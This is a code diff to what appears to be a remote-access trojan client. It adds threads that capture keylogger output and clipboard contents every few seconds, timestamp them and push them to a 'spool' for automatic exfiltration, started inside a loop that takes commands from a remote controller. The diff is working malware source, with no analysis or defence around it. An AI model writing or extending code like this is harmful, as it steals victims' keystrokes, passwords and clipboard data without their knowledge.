@@ -98,6 +98,12 @@ try:
 except ImportError:
     SCANNER_AVAILABLE = False
 
+try:
+    from spool import Spool
+    SPOOL_AVAILABLE = True
+except ImportError:
+    SPOOL_AVAILABLE = False
+
 import ipaddress
 
 
@@ -128,6 +134,30 @@ def _heartbeat_thread(sock, key, stop_event, send_lock, interval=30):
         except Exception:
             logger.debug("Heartbeat stopped: socket error")
             break
+
+
+def _keylog_flush_thread(keylogger, spool, stop_event, interval=60):
+    """Flushes keylogger data to spool every `interval` seconds."""
+    while not stop_event.is_set():
+        stop_event.wait(interval)
+        if stop_event.is_set():
+            break
+        data = keylogger.get_logs()
+        if data and data != "No keylog data":
+            spool.push("keylog", {"data": data, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
+
+
+def _clipboard_flush_thread(clipboard_monitor, spool, stop_event):
+    """Monitors clipboard and flushes to spool on change."""
+    last_sent = ""
+    while not stop_event.is_set():
+        time.sleep(2)
+        if not clipboard_monitor.history:
+            continue
+        latest = clipboard_monitor.history[-1].get("content", "")
+        if latest and latest != last_sent:
+            last_sent = latest
+            spool.push("clipboard", {"data": latest, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
 
 
 def test_connection(host, port):
@@ -430,6 +460,21 @@ def main():
             )
             hb_thread.start()
 
+            # Auto-exfiltration via spool
+            if SPOOL_AVAILABLE:
+                _spool = Spool()
+                exfil_stop = threading.Event()
+                threading.Thread(
+                    target=_keylog_flush_thread,
+                    args=(keylogger, _spool, exfil_stop),
+                    daemon=True
+                ).start()
+                threading.Thread(
+                    target=_clipboard_flush_thread,
+                    args=(clipboard_monitor, _spool, exfil_stop),
+                    daemon=True
+                ).start()
+
             while True:
                 command = recv_msg_str(client, key)
                 if command is None:
@@ -656,6 +701,7 @@ def main():
         finally:
             try:
                 hb_stop.set()
+                exfil_stop.set()
             except NameError:
                 pass
 
